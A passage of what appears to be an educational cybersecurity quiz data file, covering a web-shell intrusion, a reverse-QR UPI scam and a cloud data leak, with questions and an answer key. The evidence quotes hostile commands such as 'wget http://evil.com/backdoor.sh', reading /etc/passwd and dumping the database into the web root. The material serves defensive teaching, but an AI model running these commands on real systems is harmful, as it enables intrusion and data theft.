                "options": ["www-data", "root", "admin", "student"],
                "answer": 0,
                "explanation": "The Apache log notes: 'GET /uploads/gallery_photo.php?cmd=whoami returned www-data'."
            },
            {
                "text": "What command did the attacker execute to extract the full database into a publicly downloadable file?",
                "options": [
                    "mysqldump -u root -p college_portal > /var/www/html/backup.sql",
                    "sqlmap -u http://college.edu --dump",
                    "tar -czvf database.tar.gz /var/lib/mysql",
                    "export db college_portal to file"
                ],
                "answer": 0,
                "explanation": "Evidence 3 documents execution of 'mysqldump -u root -p college_portal > /var/www/html/backup.sql'."
            },
            {
                "text": "What file was modified to silently redirect mobile visitors to a fraudulent ad network?",
                "options": [".htaccess", "robots.txt", "php.ini", "web.config"],
                "answer": 0,
                "explanation": "Evidence 2 states: '.htaccess file overwritten with RewriteRule redirecting mobile traffic'."
            },
            {
                "text": "What permissions were assigned to the '/var/www/html/uploads' directory?",
                "options": ["777 (Read, Write, Execute for all)", "755", "644", "400"],
                "answer": 0,
                "explanation": "Evidence 4 records: 'Directory /var/www/html/uploads had full 777 permissions'."
            },
            {
                "text": "Why was the attacker able to download the database dump directly over HTTP?",
                "options": [
                    "The dump was saved in the public web root directory '/var/www/html/'",
                    "The database was encrypted with an open key",
                    "The college firewall was disconnected from the wall",
                    "MySQL ports are open to web browsers by default"
                ],
                "answer": 0,
                "explanation": "Placing 'backup.sql' inside '/var/www/html/' made it directly downloadable by browsing to its URL."
            },
            {
                "text": "What parameter in the URL allowed the attacker to pass arbitrary terminal commands to the web shell?",
                "options": ["?cmd=", "?search=", "?id=", "?page="],
                "answer": 0,
                "explanation": "The Apache logs show commands passed via '?cmd=whoami' and '?cmd=cat /etc/passwd'."
            },
            {
                "text": "What configuration setting in Apache would have prevented PHP execution inside the uploads folder?",
                "options": [
                    "php_admin_flag engine off (or RemoveHandler .php)",
                    "ServerTokens Prod",
                    "KeepAlive On",
                    "MaxClients 150"
                ],
                "answer": 0,
                "explanation": "Disabling the PHP engine inside upload folders prevents script execution even if files are uploaded."
            },
            {
                "text": "What secondary payload did the attacker attempt to download using 'wget'?",
                "options": ["http://evil.com/backdoor.sh", "http://google.com/search", "http://college.edu/fix.sh", "http://github.com/patch.sh"],
                "answer": 0,
                "explanation": "Evidence 1 logs: '?cmd=wget http://evil.com/backdoor.sh'."
            },
            # Medium-Hard Q9-Q13
            {
                "text": "What is the primary risk of running the web server process as 'www-data' without chroot or container isolation?",
                "options": [
                    "A web shell can read sensitive files accessible to web group and explore system utilities",
                    "The entire computer will shut down automatically",
                    "Only administrators can visit the website",
                    "The website cannot connect to the internet"
                ],
                "answer": 0,
                "explanation": "An unconfined process lets web shells execute system binaries like cat, wget, and mysqldump."
            },
            {
                "text": "Why is an account lockout policy of 5 failed attempts crucial against brute force attacks?",
                "options": [
                    "It stops automated tools from testing thousands of passwords per minute",
                    "It saves battery power on the user's laptop",
                    "It makes the website load faster for legitimate visitors",
                    "It automatically emails the attacker's home address to police"
                ],
                "answer": 0,
                "explanation": "Lockouts render high-speed dictionary guessing ineffective by freezing authentication."
            },
            {
                "text": "How did the attacker pivot from application-level access to system-level command execution?",
                "options": [
                    "By uploading and invoking a PHP web shell containing system execution functions like 'shell_exec()'",
                    "By sending an email to the college principal",
                    "By clicking the Refresh button on the defaced homepage",
                    "By connecting an external USB drive to the server"
                ],
                "answer": 0,
                "explanation": "PHP functions such as shell_exec() or system() bridge web requests into operating system commands."
            },
            {
                "text": "What file integrity monitoring (FIM) tool alert would have immediately caught the homepage alteration?",
                "options": [
                    "An alert detecting an unauthorized hash change on 'index.html' and '.htaccess'",
                    "An alert monitoring CPU temperature",
                    "A notification about a full printer queue",
                    "A warning that RAM usage is below 10%"
                ],
                "answer": 0,
                "explanation": "File Integrity Monitoring alerts whenever core system files differ from their approved checksums."
            },
            {
                "text": "Why should database credentials never be stored in plaintext inside web application configuration files?",
                "options": [
                    "Any web shell that reads web application files can immediately compromise the backend database",
                    "Plaintext files take twice as long for computers to read",
                    "Plaintext files cannot be opened on Linux systems",
                    "Database passwords only work when stored in audio format"
                ],
                "answer": 0,
                "explanation": "Web shell access allows adversaries to read config files and obtain full database master passwords."
            },
            # Challenging Q14-Q15
            {
                "text": "Reconstructing the attacker's kill chain, what is the exact chronological order of exploitation?",
                "options": [
                    "Brute force admin portal -> Upload web shell -> Execute commands & dump DB -> Overwrite homepage & .htaccess",
                    "Overwrite homepage -> Dump DB -> Upload web shell -> Brute force admin portal",
                    "Execute commands -> Overwrite .htaccess -> Brute force admin portal -> Upload web shell",
                    "Dump DB -> Overwrite homepage -> Brute force admin portal -> Upload web shell"
                ],
                "answer": 0,
                "explanation": "Timestamps prove: brute force at 01:55, shell upload at 02:02, commands/dump at 02:04-02:06, defacement at 02:10."
            },
            {
                "text": "What is the complete defense-in-depth strategy to permanently secure this web application?",
                "options": [
                    "Strict input/upload validation, directory execution disablement, MFA on admin login, and database isolation",
                    "Only changing the homepage background image",
                    "Deleting all images from the gallery plugin",
                    "Restarting the Apache server every 4 hours"
                ],
                "answer": 0,
                "explanation": "Defense-in-depth requires hardening authentication, restricting file uploads, isolating storage, and sandboxing processes."
            }
        ]
    },

    "case-04": {
        "id": "case-04",
        "name": "CASE 04 — FAKE ONLINE PAYMENT",
        "summary": "A student loses money after a suspicious online transaction. Trace the evidence and identify the fraud.",
        "evidence": [
            {
                "tag": "PAYMENT RECORD",
                "time": "14:22:10 UTC",
                "title": "UNAUTHORIZED UPI TRANSFER",
                "details": "Student transferred ₹4,500 to VPA 'quick_refund_desk@ybl' believing it was a college canteen rebate refund."
            },
            {
                "tag": "CHAT LOG",
                "time": "14:18:00 UTC",
                "title": "REVERSE QR CODE SCAM",
                "details": "Scammer claimed: 'Scan this QR code and enter your UPI PIN to RECEIVE your ₹4,500 cash rebate.'"
            },
            {
                "tag": "TRANSACTION RECEIPT",
                "time": "14:23:05 UTC",
                "title": "DEBIT CONFIRMATION",
                "details": "Bank SMS: 'A/c XX409 debited by Rs. 4,500 to quick_refund_desk. Available balance Rs. 210. Never share UPI PIN.'"
            },
            {
                "tag": "CALL RECORD",
                "time": "14:15:30 UTC",
                "title": "SPOOFED SUPPORT CALL",
                "details": "Caller claimed to be 'State Bank Payment Desk' using an unverified mobile number +91 98765 00000."
            }
        ],
        "round2Evidence": [
            {
                "tag": "UPI INTENT LOG",
                "time": "14:21:45 UTC",
                "title": "COLLECT REQUEST MANIPULATION",
                "details": "The scam QR code encoded a UPI Collect / Pay intent: 'upi://pay?pa=quick_refund_desk@ybl&am=4500&pn=RebateRefund'. The parameter 'am=4500' set an automatic debit amount instead of a credit."
            },
            {
                "tag": "MONEY TRAIL",
                "time": "14:25:12 UTC",
                "title": "INSTANT MULTI-WALLET CASHOUT",
                "details": "Within 3 minutes of receipt, ₹4,500 was split across three prepaid digital wallets and cashed out at an off-grid ATM in another state."
            },
            {
                "tag": "CALL LOG TELEMETRY",
                "time": "14:14:00 UTC",
                "title": "VOIP SPOOFED CALLER ID",
                "details": "Telecom switch trace proves +91 98765 00000 was generated via an offshore SIP VoIP service provider without genuine SIM IMSI registration."
            },
            {
                "tag": "DEVICE AUDIT",
                "time": "14:20:10 UTC",
                "title": "SCREEN SHARE APP DETECTION",
                "details": "Scammer persuaded student to install 'QuickSupport' utility prior to the transaction, allowing real-time viewing of bank balance and OTP prompts."
            }
        ],
        "questions": [
            # Round 1
            {
                "text": "How much money was debited from the student's account?",
                "options": ["₹4,500", "₹10,000", "₹500", "₹1,000"],
                "answer": 0,
                "explanation": "The payment record and bank SMS confirm the amount debited was ₹4,500."
            },
            {
                "text": "What Virtual Payment Address (VPA) received the fraudulent transfer?",
                "options": ["quick_refund_desk@ybl", "college_canteen@sbi", "refund_official@icici", "admin@axis"],
                "answer": 0,
                "explanation": "Evidence 1 shows the payment went to VPA 'quick_refund_desk@ybl'."
            },
            {
                "text": "What fundamental rule of UPI did the scammer violate when asking for the PIN?",
                "options": [
                    "You NEVER need to enter your UPI PIN to receive money",
                    "UPI PIN is required for all incoming transactions",
                    "UPI PIN must be entered twice to receive refunds",
                    "UPI PIN is shared with the caller for verification"
                ],
                "answer": 0,
                "explanation": "Entering a UPI PIN authorizes outgoing debits; receiving funds never requires a PIN."
            },
            {
                "text": "What pretext did the scammer use to lure the student into the transaction?",
                "options": ["A college canteen rebate refund", "A national lottery prize", "An unpaid library fine", "A semester tuition bill"],
                "answer": 0,
                "explanation": "Evidence 1 states the student believed it was a college canteen rebate refund."
            },
            {
                "text": "What phone number was used in the spoofed support call?",
                "options": ["+91 98765 00000", "+91 12345 67890", "1800-111-222", "100"],
                "answer": 0,
                "explanation": "Evidence 4 records the caller used unverified number +91 98765 00000."
            },
            {
                "text": "What organization did the scam caller claim to represent?",
                "options": ["State Bank Payment Desk", "College Sports Office", "Police Department", "Hostel Warden"],
                "answer": 0,
                "explanation": "Evidence 4 states the caller claimed to be 'State Bank Payment Desk'."
            },
            {
                "text": "What warning is explicitly included in the bank SMS confirmation?",
                "options": ["Never share UPI PIN", "Do not turn off phone", "Call support immediately", "Delete this message"],
                "answer": 0,
                "explanation": "Evidence 3 shows the bank SMS states: 'Never share UPI PIN'."
            },
            {
                "text": "What balance remained in the student's account after the transaction?",
                "options": ["Rs. 210", "Rs. 0", "Rs. 4,500", "Rs. 1,000"],
                "answer": 0,
                "explanation": "Evidence 3 quotes bank SMS: 'Available balance Rs. 210'."
            },
            {
                "text": "What type of trick is scanning a QR code under the promise of 'receiving' money called?",
                "options": ["Reverse QR Code scam", "WiFi eavesdropping", "SQL Injection", "Ransomware"],
                "answer": 0,
                "explanation": "Evidence 2 categorizes this trick as a 'Reverse QR Code scam'."
            },
            {
                "text": "At what time was the unauthorized UPI transfer recorded?",
                "options": ["14:22:10 UTC", "10:00:00 UTC", "08:15:30 UTC", "16:45:00 UTC"],
                "answer": 0,
                "explanation": "Evidence 1 logs the transfer at 14:22:10 UTC."
            },
            {
                "text": "How many minutes passed between the scammer's chat request and the debit?",
                "options": ["About 4 to 5 minutes", "2 days", "3 hours", "60 minutes"],
                "answer": 0,
                "explanation": "The chat log was at 14:18:00 UTC and debit occurred at 14:22:10 UTC (approx. 4 minutes)."
            },
            {
                "text": "If a caller asks you to read an OTP or enter a PIN to receive cashback, what should you do?",
                "options": [
                    "Disconnect the call immediately and never share credentials",
                    "Follow their instructions quickly",
                    "Ask your friend to enter their PIN instead",
                    "Enter a wrong PIN 10 times"
                ],
                "answer": 0,
                "explanation": "Official banking channels never require PINs to issue cashback or rebates."
            },
            {
                "text": "Which banking service handles UPI transactions in India?",
                "options": ["National Payments Corporation of India (NPCI)", "NASA", "Federal Reserve", "Interpol"],
                "answer": 0,
                "explanation": "UPI is developed and operated by NPCI in India."
            },
            # Tricky Q14
            {
                "text": "Why are QR codes particularly effective for scammers in payment fraud?",
                "options": [
                    "Humans cannot read the encoded payload text with the naked eye before scanning",
                    "QR codes disable phone antivirus software",
                    "QR codes are illegal in banking",
                    "QR codes only work on stolen phones"
                ],
                "answer": 0,
                "explanation": "Because QR codes are machine-readable barcodes, victims cannot easily verify intent parameters without scanning."
            },
            # Tricky Q15
            {
                "text": "Why did the phone display '+91 98765 00000' even though the caller was not from a bank?",
                "options": [
                    "Caller ID spoofing allows attackers to transmit fake originating numbers over VoIP",
                    "The bank accidentally gave out their private SIM card",
                    "The student had saved that number in contacts previously",
                    "The number was assigned by the college network"
                ],
                "answer": 0,
                "explanation": "VoIP SIP trunks allow callers to specify arbitrary caller ID strings to impersonate legitimate entities."
            }
        ],
        "round2Questions": [
            # Round 2
            {
                "text": "What specific parameter in the UPI intent URI set the debit amount to ₹4,500?",
                "options": ["am=4500", "pa=quick_refund_desk", "pn=RebateRefund", "mc=0000"],
                "answer": 0,
                "explanation": "In standard UPI intent URIs, 'am=' specifies the transaction amount to be paid."
            },
            {
                "text": "What screen sharing application was installed on the victim's device?",
                "options": ["QuickSupport", "AnyDesk", "TeamViewer", "VNC"],
                "answer": 0,
                "explanation": "Evidence 4 records: 'Scammer persuaded student to install QuickSupport utility'."
            },
            {
                "text": "How quickly was the stolen ₹4,500 laundered and withdrawn after receipt?",
                "options": ["Within 3 minutes", "After 24 hours", "After 1 week", "It was never withdrawn"],
                "answer": 0,
                "explanation": "Evidence 2 states: 'Within 3 minutes of receipt, ₹4,500 was split across three prepaid wallets and cashed out'."
            },
            {
                "text": "What telecommunications technology allowed the scammer to forge caller ID without a physical SIM?",
                "options": ["Offshore SIP VoIP trunking", "5G satellite link", "Analog landline", "Bluetooth tethering"],
                "answer": 0,
                "explanation": "Evidence 3 confirms caller ID was generated via an offshore SIP VoIP service provider."
            },
            {
                "text": "Why did the scammer instruct the student to install QuickSupport?",
                "options": [
                    "To view the student's screen in real time and monitor bank account balance and OTPs",
                    "To speed up the phone's charging speed",
                    "To clean junk files from the phone storage",
                    "To verify the phone's screen resolution"
                ],
                "answer": 0,
                "explanation": "Screen sharing apps let fraudsters observe banking app interactions and incoming verification prompts."
            },
            {
                "text": "What is a 'money mule' wallet or account in the context of online financial fraud?",
                "options": [
                    "An intermediary account used to rapidly layer and cash out stolen funds to evade freezing",
                    "An account owned directly by the bank's CEO",
                    "A savings account that charges zero transaction fees",
                    "A special account created for international students"
                ],
                "answer": 0,
                "explanation": "Money mules receive and transfer illicit funds to obscure the final recipient and avoid account freezes."
            },
            {
                "text": "What does 'pa=' stand for in a UPI intent URI like 'upi://pay?pa=quick_refund_desk@ybl'?",
                "options": ["Payee Address (the recipient's Virtual Payment Address)", "Payment Amount", "Payee Account Number", "Personal Authorization"],
                "answer": 0,
                "explanation": "In the UPI spec, 'pa' defines the Payee Address (VPA) receiving the transfer."
            },
            {
                "text": "What immediate action should the victim take within the 'Golden Hour' of financial cyber fraud?",
                "options": [
                    "Call the national cybercrime helpline 1930 and report to their bank to freeze the beneficiary VPA",
                    "Wait 3 days to see if the money is returned automatically",
                    "Factory reset their smartphone",
                    "Post about the incident on social media and do nothing else"
                ],
                "answer": 0,
                "explanation": "Promptly reporting to 1930 / bank enables authorities to flag and freeze funds before ATM cash-out."
            },
            # Medium-Hard Q9-Q13
            {
                "text": "Why does UPI architecture require two distinct security factors (Device Binding + UPI PIN)?",
                "options": [
                    "To verify both 'something you have' (registered SIM) and 'something you know' (secret PIN)",
                    "To make payments take 15 minutes to process",
                    "To allow banks to charge double transaction fees",
                    "To enable payments without an internet connection"
                ],
                "answer": 0,
                "explanation": "UPI binds the device via encrypted SMS handshake and requires the knowledge-based PIN for authorization."
            },
            {
                "text": "How did the scammer exploit the visual design of payment apps to deceive the user?",
                "options": [
                    "By presenting a Pay request as a 'Refund Confirmation' screen",
                    "By changing the app's language to Latin",
                    "By hiding the smartphone status bar",
                    "By replacing the phone's battery icon"
                ],
                "answer": 0,
                "explanation": "Fraudsters label collect requests with terms like 'Refund' or 'Cashback' so careless users approve without reading."
            },
            {
                "text": "Why is it virtually impossible to recover funds once they are withdrawn as cash from an off-grid ATM?",
                "options": [
                    "Cash transactions leave no further digital banking trail that can be reversed by bank freeze orders",
                    "ATM cameras are never reviewed by police",
                    "Cash notes automatically change serial numbers",
                    "Banks are legally prohibited from investigating cash withdrawals"
                ],
                "answer": 0,
                "explanation": "Once converted to physical currency, electronic banking hold/lien mechanisms cannot claw back the funds."
            },
            {
                "text": "What permission in Android allows remote assistance apps like QuickSupport to capture screen content?",
                "options": [
                    "MediaProjection / Screen Capture permission",
                    "Camera access permission",
                    "Bluetooth scanning permission",
                    "Vibration control permission"
                ],
                "answer": 0,
                "explanation": "The MediaProjection API prompts the user to grant permission to record or cast display contents."
            },
            {
                "text": "What telecom mechanism is currently being deployed to combat caller ID spoofing globally?",
                "options": [
                    "STIR/SHAKEN digital certificate cryptographic verification for call origins",
                    "Banning all international phone calls",
                    "Disabling caller ID display on all phones",
                    "Charging ₹50 for every phone call"
                ],
                "answer": 0,
                "explanation": "STIR/SHAKEN authenticates telephone calls cryptographically, ensuring the caller ID matches carrier records."
            },
            # Challenging Q14-Q15
            {
                "text": "Examining the multi-stage scam, what were the three distinct attack vectors combined by the fraudster?",
                "options": [
                    "VoIP Vishing (caller ID spoofing), Screen Sharing surveillance, and Reverse QR Code debit manipulation",
                    "Ransomware encryption, SQL injection, and DDoS attack",
                    "Physical theft, SIM clone, and ATM skimming",
                    "Wi-Fi spoofing, Bluetooth sniffing, and DNS poisoning"
                ],
                "answer": 0,
                "explanation": "The adversary orchestrated phone impersonation (vishing), screen capture (QuickSupport), and reverse QR manipulation."
            },
            {
                "text": "What systemic banking safeguard would best protect non-technical users from reverse QR fraud?",
                "options": [
                    "Prominently displaying 'YOU ARE PAYING MONEY' in large red text before prompting for UPI PIN",
                    "Removing QR codes completely from all stores",
                    "Allowing anyone to transfer money without any PIN",
                    "Disabling UPI on all student accounts"
                ],
                "answer": 0,
                "explanation": "Explicit, high-contrast UX warnings indicating outgoing payment amounts prevent confused approvals."
            }
        ]
    },

    "case-05": {
        "id": "case-05",
        "name": "CASE 05 — LEAKED STUDENT DATA",
        "summary": "Private student information appears on an unauthorised platform. Investigate how the information may have been exposed.",
        "evidence": [
            {
                "tag": "DATA LEAK",
                "time": "11:00:00 UTC",
                "title": "FORUM POST WITH SENSITIVE DATA",
                "details": "A post on a public forum published a spreadsheet with 1,200 student names, phone numbers, home addresses, and roll numbers."
            },
            {
                "tag": "FILE METADATA",
                "time": "11:05:22 UTC",
                "title": "EXCEL FILE PROPERTIES",
                "details": "File 'CSE_Students_Master_2026.xlsx' author property: 'prof_ramesh_laptop'. Created with Microsoft Excel on 2026-08-14."
            },
            {
                "tag": "CLOUD STORAGE AUDIT",
                "time": "11:20:40 UTC",
                "title": "PUBLIC CLOUD LINK",
                "details": "Faculty Google Drive folder shared with setting 'Anyone with the link can view' instead of restricted institutional access."
            },
            {
                "tag": "LINK INDEXING",
                "time": "11:35:10 UTC",
                "title": "PUBLIC SEARCH ENGINE INDEXING",
                "details": "The public Google Drive link was pasted into a public discussion channel and indexed by search bots."
            }
        ],
        "round2Evidence": [
            {
                "tag": "CLOUD AUDIT LOG",
                "time": "11:22:15 UTC",
                "title": "ANONYMOUS BULK DOWNLOAD SPIKE",
                "details": "Google Workspace admin audit logs reveal 84 automated curl/python-requests download requests from scraping bot IP 198.51.100.42 within 90 seconds."
            },
            {
                "tag": "ACCESS PERMISSIONS",
                "time": "11:24:00 UTC",
                "title": "INHERITED FOLDER PERMISSIONS",
                "details": "The sensitive student database spreadsheet was placed inside an unorganized parent folder titled 'General_CSE_Notices' which had inherited public sharing enabled 6 months ago."
            },
            {
                "tag": "DATA SCRAPING",
                "time": "11:28:30 UTC",
                "title": "TELEGRAM DATA LEAK CHANNEL",
                "details": "The scraped dataset was repackaged and uploaded to a Telegram channel specializing in college student databases for telemarketing and spam."
            },
            {
                "tag": "DLP CONFIG AUDIT",
                "time": "11:40:00 UTC",
                "title": "MISSING DLP POLICY",
                "details": "The institutional cloud tenant had not enforced Data Loss Prevention (DLP) rules to block sharing files containing Aadhaar numbers or personal contact databases outside the college domain."
            }
        ],
        "questions": [
            # Round 1
            {
                "text": "How many student records were contained in the leaked spreadsheet?",
                "options": ["1,200", "50", "10,000", "500"],
                "answer": 0,
                "explanation": "Evidence 1 states the spreadsheet contained records for 1,200 students."
            },
            {
                "text": "What was the filename of the leaked student database?",
                "options": ["CSE_Students_Master_2026.xlsx", "exam_results.pdf", "college_photos.zip", "canteen_menu.docx"],
                "answer": 0,
                "explanation": "Evidence 2 states the filename was 'CSE_Students_Master_2026.xlsx'."
            },
            {
                "text": "What author property was discovered inside the Excel file metadata?",
                "options": ["prof_ramesh_laptop", "admin_desktop", "hacker_unknown", "student_rep"],
                "answer": 0,
                "explanation": "Evidence 2 shows the file properties listed author 'prof_ramesh_laptop'."
            },
            {
                "text": "What sharing setting was enabled on the faculty Google Drive folder?",
                "options": ["Anyone with the link can view", "Restricted to specific emails only", "Password protected", "Private to owner only"],
                "answer": 0,
                "explanation": "Evidence 3 indicates the folder was set to 'Anyone with the link can view'."
            },
            {
                "text": "How did search engines discover and index the public drive link?",
                "options": [
                    "The link was pasted into a public discussion channel where search bots crawl",
                    "Google Drive automatically publishes all private files to the newspaper",
                    "The professor advertised the link on television",
                    "Search bots guessed a 256-bit cryptographic key"
                ],
                "answer": 0,
                "explanation": "Evidence 4 records: 'The public Google Drive link was pasted into a public discussion channel and indexed by search bots'."
            },
            {
                "text": "What types of sensitive personal data were exposed in the spreadsheet?",
                "options": [
                    "Student names, phone numbers, home addresses, and roll numbers",
                    "Only the college lunch menu",
                    "Classroom furniture dimensions",
                    "Public holiday calendar dates"
                ],
                "answer": 0,
                "explanation": "Evidence 1 lists: '1,200 student names, phone numbers, home addresses, and roll numbers'."
            },
            {
                "text": "On what date was the Excel file originally created according to its properties?",
                "options": ["2026-08-14", "2020-01-01", "Yesterday", "2026-12-25"],
                "answer": 0,
                "explanation": "Evidence 2 records: 'Created with Microsoft Excel on 2026-08-14'."
            },
            {
                "text": "Where was the sensitive data initially published online?",
                "options": ["A public discussion forum", "An encrypted offline USB drive", "The college notice board", "An official government gazette"],
                "answer": 0,
                "explanation": "Evidence 1 states a post on a public forum published the spreadsheet."
            },
            {
                "text": "What software was used to create the leaked spreadsheet?",
                "options": ["Microsoft Excel", "Adobe Photoshop", "AutoCAD", "VLC Media Player"],
                "answer": 0,
                "explanation": "Evidence 2 states: 'Created with Microsoft Excel on 2026-08-14'."
            },
            {
                "text": "What should the sharing setting of confidential student records be restricted to?",
                "options": [
                    "Restricted institutional accounts with specific authorization",
                    "Anyone with the link on the public internet",
                    "Public search engine crawlers",
                    "Anonymous file sharing websites"
                ],
                "answer": 0,
                "explanation": "Confidential data should be restricted strictly to authorized institutional accounts."
            },
            {
                "text": "At what time was the public forum post with the data noticed?",
                "options": ["11:00:00 UTC", "03:15:22 UTC", "08:12:00 UTC", "14:22:10 UTC"],
                "answer": 0,
                "explanation": "Evidence 1 is timestamped at 11:00:00 UTC."
            },
            {
                "text": "Why is leaking student phone numbers and home addresses dangerous?",
                "options": [
                    "It exposes students to unsolicited spam, harassment, and targeted phishing",
                    "It makes phone batteries drain faster",
                    "It automatically uninstalls mobile apps",
                    "It changes the student's college degree title"
                ],
                "answer": 0,
                "explanation": "Exposed contact data enables harassment, identity theft, and tailored phishing attacks."
            },
            {
                "text": "What immediate step should the faculty member take upon discovering the exposure?",
                "options": [
                    "Immediately revoke public link access and make the Drive folder restricted",
                    "Wait until the end of the semester to review it",
                    "Rename the file and keep the public link active",
                    "Upload five more spreadsheets to test the link"
                ],
                "answer": 0,
                "explanation": "Revoking public access immediately prevents further unauthorized downloads."
            },
            # Tricky Q14
            {
                "text": "Can removing a public link from Google Drive guarantee that leaked data disappears from the internet?",
                "options": [
                    "No, because anyone who already downloaded or mirrored the file retains a permanent copy",
                    "Yes, Google Drive automatically deletes all copies everywhere on the internet",
                    "Yes, because files expire after 24 hours automatically",
                    "No, but only if the file was a PDF document"
                ],
                "answer": 0,
                "explanation": "Once data is downloaded publicly, third parties can store and redistribute mirrors indefinitely."
            },
            # Tricky Q15
            {
                "text": "What is the key difference between an external hacker breach and this data exposure incident?",
                "options": [
                    "This incident was caused by cloud misconfiguration and human error, not malicious hacking into servers",
                    "An external breach only happens on Mondays",
                    "Cloud misconfiguration can never be detected by IT",
                    "There is no difference between the two"
                ],
                "answer": 0,
                "explanation": "The incident stemmed from improper sharing permissions (misconfiguration) rather than system compromise."
            }
        ],
        "round2Questions": [
            # Round 2
            {
                "text": "How many automated download requests were recorded by the scraping bot in 90 seconds?",
                "options": ["84 requests", "10 requests", "1,000 requests", "Only 1 request"],
                "answer": 0,
                "explanation": "Evidence 1 logs 84 automated curl/python-requests requests from IP 198.51.100.42 within 90 seconds."
            },
            {
                "text": "What was the parent folder name that passed public inherited permissions to the student database?",
                "options": ["General_CSE_Notices", "Private_Staff_Vault", "Admin_Root", "Restricted_Database"],
                "answer": 0,
                "explanation": "Evidence 2 states the file was placed inside parent folder 'General_CSE_Notices'."
            },
            {
                "text": "To which messaging platform was the scraped dataset uploaded for telemarketing distribution?",
                "options": ["Telegram", "Signal", "WhatsApp", "WeChat"],
                "answer": 0,
                "explanation": "Evidence 3 specifies the dataset was repackaged and uploaded to a Telegram channel."
            },
            {
                "text": "What institutional security policy was missing in the college cloud tenant?",
                "options": [
                    "Data Loss Prevention (DLP) policy to block external sharing of sensitive records",
                    "Dark mode UI policy",
                    "Video streaming bandwidth limits",
                    "Student wallpaper policy"
                ],
                "answer": 0,
                "explanation": "Evidence 4 notes the tenant lacked Data Loss Prevention (DLP) rules."
            },
            {
                "text": "What user-agent headers were used by the scraper IP to pull the spreadsheet?",
                "options": ["curl / python-requests", "Mozilla Safari", "Googlebot verified", "Microsoft Edge"],
                "answer": 0,
                "explanation": "Evidence 1 identifies automated 'curl/python-requests' scripts."
            },
            {
                "text": "Why do inherited folder permissions represent a common vulnerability in cloud storage?",
                "options": [
                    "Files placed inside a public folder automatically inherit public sharing without explicit warning",
                    "Folders delete all files after 30 days",
                    "Inherited folders cannot store spreadsheets",
                    "Cloud storage encrypts files so heavily that owners lose access"
                ],
                "answer": 0,
                "explanation": "Files automatically inherit parent folder permissions; placing sensitive files in public folders exposes them."
            },
            {
                "text": "How does an institutional Data Loss Prevention (DLP) system work in Google Workspace?",
                "options": [
                    "It scans file content for regex patterns like Aadhaar/credit cards and restricts external sharing automatically",
                    "It shuts down the user's computer when a spreadsheet is opened",
                    "It converts all spreadsheets into plain text files",
                    "It deletes student emails older than 7 days"
                ],
                "answer": 0,
                "explanation": "DLP scans file bodies and metadata for sensitive identifiers and enforces organizational sharing blocks."
            },
            {
                "text": "What IP address carried out the automated bulk download scraping?",
                "options": ["198.51.100.42", "192.168.1.1", "10.0.0.5", "127.0.0.1"],
                "answer": 0,
                "explanation": "Evidence 1 records scraping bot IP 198.51.100.42."
            },
            # Medium-Hard Q9-Q13
            {
                "text": "What privacy law or regulatory compliance standard is violated when student PII is exposed publicly?",
                "options": [
                    "Data Protection Act / Privacy Regulations governing personal identifiable information (PII)",
                    "Maritime Shipping Act",
                    "Air Traffic Control Regulations",
                    "Building Construction Code"
                ],
                "answer": 0,
                "explanation": "Exposure of student PII violates data protection statutes, carrying legal penalties and institutional liability."
            },
            {
                "text": "How can web scrapers locate publicly shared Google Drive links automatically?",
                "options": [
                    "By querying search engine indexing APIs for 'drive.google.com/drive/folders/' across public forums and repos",
                    "By guessing random 64-character URLs manually",
                    "By calling the Google headquarters helpdesk",
                    "By monitoring satellite television signals"
                ],
                "answer": 0,
                "explanation": "Scrapers search indexing services and public channels for shared drive URL patterns (Google Dorking)."
            },
            {
                "text": "What metadata hygiene step should be performed before sharing any office document externally?",
                "options": [
                    "Sanitizing author names, company properties, and revision history via document inspection tools",
                    "Changing the font size to 12 pt",
                    "Adding a colorful cover page",
                    "Saving the file with all capital letters in the title"
                ],
                "answer": 0,
                "explanation": "Document sanitization strips author usernames, internal paths, and change history."
            },
            {
                "text": "Why are Telegram channels frequently chosen by data brokers to distribute leaked databases?",
                "options": [
                    "Telegram allows large file sharing, anonymous channel creation, and resists regional takedown orders",
                    "Telegram requires government ID to create a channel",
                    "Telegram automatically encrypts spreadsheets into audio files",
                    "Telegram is only accessible on university campuses"
                ],
                "answer": 0,
                "explanation": "Telegram supports large broadcast channels with pseudo-anonymous admin handles and minimal moderation."
            },
            {
                "text": "What administrative Google Workspace setting prevents faculty from creating public link shares entirely?",
                "options": [
                    "Disabling external sharing to 'OFF' in Drive sharing settings for the Staff Organizational Unit",
                    "Deleting all faculty email accounts",
                    "Limiting Google Drive storage to 10 MB per teacher",
                    "Enabling dark mode for all users"
                ],
                "answer": 0,
                "explanation": "Workspace admins can globally restrict external sharing outside the verified domain for staff OUs."
            },
            # Challenging Q14-Q15
            {
                "text": "Reconstructing the breach root cause, what combination of organizational failures led to this incident?",
                "options": [
                    "Lack of DLP enforcement, overly broad folder inheritance, and sharing links on public forums",
                    "A zero-day exploit in Google's cloud hypervisor and physical theft of servers",
                    "A power outage at the campus data center followed by network cable damage",
                    "Antivirus software expiring on student personal laptops"
                ],
                "answer": 0,
                "explanation": "The failure chain combined missing DLP policies, neglected folder inheritance, and reckless link distribution."
            },
            {
                "text": "What comprehensive response protocol must the college incident team execute to handle this exposure?",
                "options": [
                    "Revoke public link, audit cloud logs, notify affected students, report to authorities, and enforce DLP policies",
                    "Simply delete the professor's Google Drive and deny anything happened",
                    "Blame the students for having their names in the spreadsheet",
                    "Restart the campus Wi-Fi router"
                ],
                "answer": 0,
                "explanation": "Comprehensive breach handling requires containment, forensic audit, transparent disclosure, and technical remediation."
            }
        ]
    }
}
